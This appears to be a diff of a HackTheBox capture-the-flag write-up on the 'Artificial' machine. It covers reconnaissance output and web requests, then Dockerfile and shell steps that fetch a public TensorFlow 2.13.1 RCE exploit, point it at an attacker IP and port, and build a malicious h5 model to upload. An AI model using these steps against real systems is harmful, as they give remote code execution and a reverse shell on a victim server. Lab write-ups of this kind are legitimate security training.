@@ -1,4 +1,4 @@
-nmap output:
+I found a webserver with nmap:
 ```
 80/tcp open  http    nginx 1.18.0 (Ubuntu)
 | http-methods: 
@@ -7,7 +7,7 @@ nmap output:
 |_http-server-header: nginx/1.18.0 (Ubuntu)
 ```
 
-gobuster output:
+I also found a few paths with gobuster:
 ```
 /dashboard            (Status: 302) [Size: 199] [--> /login]
 /logout               (Status: 302) [Size: 189] [--> /]
@@ -15,17 +15,17 @@ gobuster output:
 /register             (Status: 200) [Size: 952]
 ```
 
-nikto output:
+I get more informations with nikto:
 ```
 + HEAD nginx/1.18.0 appears to be outdated (current is at least 1.20.1).
 ```
 
-whatweb output:
+And with whatweb:
 ```
 Summary   : HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], Matomo, nginx[1.18.0], Script
 ```
 
-register request:
+I decide create a new account:
 ```
 POST /register HTTP/1.1
 Host: artificial.htb
@@ -43,8 +43,7 @@ Connection: keep-alive
 
 username=random4321&email=random4321%40mail.net&password=random4321
 ```
-
-login request:
+Then, I log in:
 ```
 POST /login HTTP/1.1
 Host: artificial.htb
@@ -63,7 +62,7 @@ Connection: keep-alive
 email=random4321%40mail.net&password=random4321
 ```
 
-dashboard request:
+I get a dashboard:
 ```
 GET /dashboard HTTP/1.1
 Host: artificial.htb
@@ -78,7 +77,7 @@ Cookie: session=eyJ1c2VyX2lkIjo3LCJ1c2VybmFtZSI6InJhbmRvbTQzMjEifQ.aJZgPw.oEFDyL
 Connection: keep-alive
 ```
 
-decoded jwt header:
+Once logged in, I got a JWT token:
 ```
 {
   "user_id": 7,
@@ -86,7 +85,7 @@ decoded jwt header:
 }
 ```
 
-dashboard upload page html:
+I decide to look at the dashboard source code:
 ```
 <main>
     <section class="dashboard-section">
@@ -110,11 +109,13 @@ dashboard upload page html:
 </main>
 ```
 
-static/requirements.txt content:
+
+I found 2 files, requirements.txt (python dependencies file):
 ```
 tensorflow-cpu==2.13.1
 ```
 
+And a Dockerfile that download the same package during the build phase:
 static/Dockerfile content:
 ```
 FROM python:3.8-slim
@@ -131,7 +132,7 @@ RUN pip install ./tensorflow_cpu-2.13.1-cp38-cp38-manylinux_2_17_x86_64.manylinu
 ENTRYPOINT ["/bin/bash"]
 ```
 
-example python code to generate h5 model (found on home page):
+This looks like it can be used with the example python code I found on home page earlier to generate a h5 model to upload:
 ```
 import numpy as np
 import pandas as pd
@@ -171,19 +172,36 @@ model.fit(X, y, epochs=100, verbose=1)
 model.save('profits_model.h5')
 ```
 
-tensorflow 2.13.1 rce: `https://github.com/Splinter0/tensorflow-rce`
+After some digging on the web I find this RCE for Tensorflow 2.13.1: `https://github.com/Splinter0/tensorflow-rce`
 
-we add this to the Dockerfile build phase:
+I add this to the Dockerfile build phase:
 ```
 # Download exploit to generate malicious h5 model with payload
 RUN curl -O https://raw.githubusercontent.com/Splinter0/tensorflow-rce/refs/heads/main/exploit.py
 
-# Replace attacker IP
-RUN sed 's/127.0.0.1/10.10.14.9/g' exploit.py
-
-# Replace attacker port
-RUN sed 's/6666/4444/g' exploit.py
+# Replace attacker IP and port
+RUN sed -i 's/127.0.0.1/10.10.14.9/g' exploit.py && sed -i 's/6666/4444/g' exploit.py
 
 # Generate malicious h5 model with payload
 RUN python exploit.py
+```
+
+Then, I generate the malicous h5 with payload:
+```
+#!/bin/bash
+
+# Enable and start Docker service
+sudo systemctl enable docker.service && sudo systemctl start docker.service
+
+# Build image (and generate payload)
+sudo docker build -t generate-h5-payload .
+
+# Run container
+sudo docker run generate-h5-payload
+
+# Get container id
+CONTAINER_ID=$(sudo docker container ls -aq --filter "ancestor=generate-h5-payload")
+
+# Download payload from container
+sudo docker cp $CONTAINER_ID:/code/exploit.h5 ./exploit.h5
 ```
